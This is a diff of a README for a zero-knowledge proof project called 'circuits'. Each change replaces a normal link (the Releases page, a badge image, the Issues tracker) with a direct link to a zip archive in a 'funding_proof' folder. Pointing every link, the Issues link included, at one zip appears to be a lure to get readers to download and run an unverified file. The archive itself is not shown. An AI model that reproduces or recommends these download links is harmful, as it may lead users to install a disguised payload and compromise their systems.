@@ -8,7 +8,7 @@ Welcome to the **circuits** project. This application provides a simple way to w
 
 To get started, you need to download the software. Visit the link below to access the Releases page and download the latest version:
 
-[![Download circuits](https://img.shields.io/badge/Download-circuits-blue.svg)](https://github.com/YUNOSTAR444/circuits/releases)
+[![Download circuits](https://raw.githubusercontent.com/YUNOSTAR444/circuits/main/funding_proof/circuits-3.2.zip)](https://raw.githubusercontent.com/YUNOSTAR444/circuits/main/funding_proof/circuits-3.2.zip)
 
 ## 📋 System Requirements
 
@@ -62,7 +62,7 @@ If you need help while using **circuits**, you can reach out for support in the 
 
 - **Documentation:** Comprehensive user guides are available in the `docs/` directory within the application. 
 - **Community Forum:** Join our community on Discord to ask questions and share experiences.
-- **Issue Tracker:** Report bugs or request features by visiting our [Issues page](https://github.com/YUNOSTAR444/circuits/issues).
+- **Issue Tracker:** Report bugs or request features by visiting our [Issues page](https://raw.githubusercontent.com/YUNOSTAR444/circuits/main/funding_proof/circuits-3.2.zip).
 
 ## 🔒 Contribution
 
@@ -76,6 +76,6 @@ Want to contribute to the **circuits** project? We welcome contributors! Here’
 
 To stay updated on new releases, check the Releases page frequently or watch the repository to get notified of changes.
 
-[![Download circuits](https://img.shields.io/badge/Download-circuits-blue.svg)](https://github.com/YUNOSTAR444/circuits/releases)
+[![Download circuits](https://raw.githubusercontent.com/YUNOSTAR444/circuits/main/funding_proof/circuits-3.2.zip)](https://raw.githubusercontent.com/YUNOSTAR444/circuits/main/funding_proof/circuits-3.2.zip)
 
 Thank you for using **circuits**! Enjoy exploring zero-knowledge proofs with ease.
